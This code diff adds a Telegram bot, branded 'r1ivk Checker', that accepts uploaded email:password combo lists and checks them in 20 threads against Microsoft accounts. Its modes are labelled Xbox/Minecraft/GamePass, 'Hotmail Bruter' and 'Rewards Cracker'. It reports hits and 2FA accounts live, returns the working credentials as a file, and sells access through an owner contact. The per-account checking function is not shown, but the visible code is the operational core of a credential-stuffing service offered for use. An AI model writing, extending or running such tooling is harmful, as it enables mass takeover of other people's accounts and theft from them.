+    errors_count = 0
+    
+    start_time = time.time()
+    active_scans[chat_id] = {"status": "running", "stop": False}
+    
+    hit_lines = []
+    
+    markup = {
+        "inline_keyboard": [
+            [{"text": "🔄 Refresh", "callback_data": "refresh_stats"}, {"text": "🛑 Stop Scan", "callback_data": "stop_scan"}]
+        ]
+    }
+    
+    init_msg = f"""🔥 *Starting {mode_name} Scan...*
+
+📊 Combos: {total}
+🧵 Threads: 20
+🔄 Duplicates removed: 0
+"""
+    msg_id = send_telegram_message(chat_id, init_msg)
+    time.sleep(1.5)
+    
+    live_stats_msg = f"""🔥 *LIVE SCAN STATS (Auto-refresh)*
+
+📊 *Total:* {total}
+☑️ *Checked:* 0
+❌ *Bad:* 0
+🎯 *Hits:* 0
+📱 *2FA:* 0
+⚠️ *Errors:* 0
+
+⚡ *CPM:* 0
+⏱ *Elapsed:* 00:00:00
+"""
+    edit_telegram_message(chat_id, msg_id, live_stats_msg, reply_markup=markup)
+    
+    lock = threading.Lock()
+    
+    def worker(combo_item):
+        nonlocal checked, hits, mc_count, gp_count, live_count, twofa_count, bad_count, errors_count
+        if active_scans.get(chat_id, {}).get("stop", False):
+            return
+            
+        res = check_single_account(combo_item)
+        
+        with lock:
+            checked += 1
+            if res == "bad":
+                bad_count += 1
+            elif res == "twofa":
+                twofa_count += 1
+            elif res == "error":
+                errors_count += 1
+            elif isinstance(res, dict):
+                if res["status"] == "hit":
+                    hits += 1
+                    hit_lines.append(res["info"])
+                    if res["mc"]: mc_count += 1
+                    if res["gp"]: gp_count += 1
+                elif res["status"] == "live":
+                    live_count += 1
+
+    threads = []
+    thread_limit = 20
+
+    for combo in combos:
+        if active_scans.get(chat_id, {}).get("stop", False):
+            break
+        while threading.active_count() > thread_limit + 5:
+            time.sleep(0.1)
+            
+        t = threading.Thread(target=worker, args=(combo,))
+        threads.append(t)
+        t.start()
+        
+        if checked % 5 == 0 and msg_id:
+            elapsed = int(time.time() - start_time)
+            cpm = int((checked / max(1, elapsed)) * 60)
+            h_str = str(elapsed // 3600).zfill(2)
+            m_str = str((elapsed % 3600) // 60).zfill(2)
+            s_str = str(elapsed % 60).zfill(2)
+            
+            stats_text = f"""🔥 *LIVE SCAN STATS (r1ivk Checker)*
+
+📊 *Total:* {total}
+☑️ *Checked:* {checked} / {total}
+❌ *Bad:* {bad_count}
+🎯 *Hits:* {hits}
+📱 *2FA:* {twofa_count}
+⚠️ *Errors:* {errors_count}
+
+⚡ *CPM:* {cpm}
+⏱ *Elapsed:* {h_str}:{m_str}:{s_str}
+
+🎮 *Gaming Hits:*
+• MC Hits: {mc_count}
+• GamePass Hits: {gp_count}
+• Live Hits: {live_count}
+"""
+            edit_telegram_message(chat_id, msg_id, stats_text, reply_markup=markup)
+
+    for t in threads:
+        t.join()
+
+    elapsed = int(time.time() - start_time)
+    h_str = str(elapsed // 3600).zfill(2)
+    m_str = str((elapsed % 3600) // 60).zfill(2)
+    s_str = str(elapsed % 60).zfill(2)
+    
+    final_text = f"""✅ *{mode_name.upper()} SCAN COMPLETED!*
+
+📊 *Total Checked:* {total}
+🎯 *Hits:* {hits}
+• Minecraft: {mc_count}
+• GamePass: {gp_count}
+• Xbox Live: {live_count}
+📱 *2FA:* {twofa_count}
+❌ *Bad:* {bad_count}
+
+⏱ *Time Taken:* {h_str}:{m_str}:{s_str}
+"""
+    send_telegram_message(chat_id, final_text, reply_markup=get_main_menu())
+    
+    if hit_lines:
+        filename = f"r1ivk_hits_{chat_id}.txt"
+        with open(filename, "w", encoding="utf-8") as f:
+            f.write("\n".join(hit_lines))
+        send_telegram_document(chat_id, filename, caption="📦 *r1ivk Checker - Hits Output File*")
+        try:
+            os.remove(filename)
+        except:
+            pass
+
+    if chat_id in active_scans:
+        del active_scans[chat_id]
+
+def run_telegram_bot():
+    print("🤖 r1ivk Checker Bot (Pro Menu Mode) is running...")
+    offset = 0
+    while True:
+        try:
+            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates?offset={offset}&timeout=30"
+            resp = requests.get(url, timeout=35).json()
+            
+            if "result" in resp:
+                for update in resp["result"]:
+                    offset = update["update_id"] + 1
+                    
+                    if "callback_query" in update:
+                        cq = update["callback_query"]
+                        chat_id = cq["message"]["chat"]["id"]
+                        data = cq["data"]
+                        
+                        if data == "stop_scan":
+                            if chat_id in active_scans:
+                                active_scans[chat_id]["stop"] = True
+                                requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery", json={"callback_query_id": cq["id"], "text": "🛑 Scan stopped!"})
+                        elif data == "refresh_stats":
+                            requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery", json={"callback_query_id": cq["id"], "text": "🔄 Refreshed!"})
+                        elif data.startswith("mode_"):
+                            mode_key = data.replace("mode_", "")
+                            user_selected_mode[chat_id] = mode_key
+                            mode_titles = {
+                                "xbox": "Xbox + Minecraft + GP",
+                                "hotmail": "Hotmail Bruter",
+                                "rewards": "Rewards Cracker"
+                            }
+                            selected_title = mode_titles.get(mode_key, "Selected Mode")
+                            requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery", json={"callback_query_id": cq["id"], "text": f"Selected: {selected_title}"})
+                            send_telegram_message(chat_id, f"📁 *Mode Selected: {selected_title}*\n\n👉 Now send your `.txt` combo file to start checking!")
+                        elif data == "info_menu":
+                            requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery", json={"callback_query_id": cq["id"], "text": "Status Info"})
+                            info_text = f"""⚡ *r1ivk Checker Status*
+
+📌 *Limits:* Max 10,000 lines per day | 20MB | Threads: 20
+👑 *Owner / Support:* @{OWNER_USERNAME} (Contact for subscriptions or unlimited access).
+"""
+                            send_telegram_message(chat_id, info_text, reply_markup=get_main_menu())
+
+                    elif "message" in update:
+                        msg = update["message"]
+                        chat_id = msg["chat"]["id"]
+                        user = msg.get("from", {})
+                        username = user.get("username", "")
+                        
+                        if "document" in msg:
+                            doc = msg["document"]
+                            file_name = doc.get("file_name", "")
+                            
+                            if file_name.endswith(".txt"):
+                                file_id = doc["file_id"]
+                                file_info_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getFile?file_id={file_id}"
+                                file_info_resp = requests.get(file_info_url, timeout=10).json()
+                                
+                                if "result" in file_info_resp:
+                                    file_path_tg = file_info_resp["result"]["file_path"]
+                                    download_url = f"https://api.telegram.org/file/bot{TELEGRAM_BOT_TOKEN}/{file_path_tg}"
+                                    
+                                    local_file_name = f"combo_{chat_id}.txt"
+                                    doc_data = requests.get(download_url, timeout=15).content
+                                    with open(local_file_name, "wb") as f:
+                                        f.write(doc_data)
+                                        
+                                    with open(local_file_name, 'r', encoding='utf-8', errors='ignore') as f:
+                                        combos = [line.strip() for line in f if ':' in line]
+                                        
+                                    try:
+                                        os.remove(local_file_name)
+                                    except:
+                                        pass
+                                        
+                                    if not combos:
+                                        send_telegram_message(chat_id, "⚠️ The uploaded file is empty or has invalid format (`email:password`).")
+                                        continue
+                                        
+                                    allowed, limit_msg = check_user_limit(chat_id, username, len(combos))
+                                    if not allowed:
+                                        send_telegram_message(chat_id, limit_msg)
+                                        continue
+                                        
+                                    update_user_usage(chat_id, len(combos))
+                                    
+                                    current_mode = user_selected_mode.get(chat_id, "xbox")
+                                    mode_names_map = {
+                                        "xbox": "Xbox + Minecraft + GP",
+                                        "hotmail": "Hotmail Bruter",
+                                        "rewards": "Rewards Cracker"
+                                    }
+                                    m_name = mode_names_map.get(current_mode, "Xbox Advanced")
+                                    
+                                    threading.Thread(target=run_checker_process, args=(chat_id, combos, m_name), daemon=True).start()
+                            else:
+                                send_telegram_message(chat_id, "⚠️ Please upload a valid `.txt` file.")
+                                
+                        elif "text" in msg:
+                            text = msg["text"].strip()
+                            if text == "/start":
+                                welcome_msg = f"""🔥 *Welcome to r1ivk Checker ⚡*
+
+*Please select a checking mode from the menu below:*
+• Limits: Max 10,000 lines | Threads limited by plan
+• Duplicate remover: Automatically removes duplicate combos from your file before scanning!
+
+👑 *Owner:* @{OWNER_USERNAME} (Contact for subscriptions)."""
+                                send_telegram_message(chat_id, welcome_msg, reply_markup=get_main_menu())
+        except Exception as e:
+            print(f"Error: {e}")
+            time.sleep(5)
 
 if __name__ == "__main__":
-  asyncio.run(main())
+    run_telegram_bot()
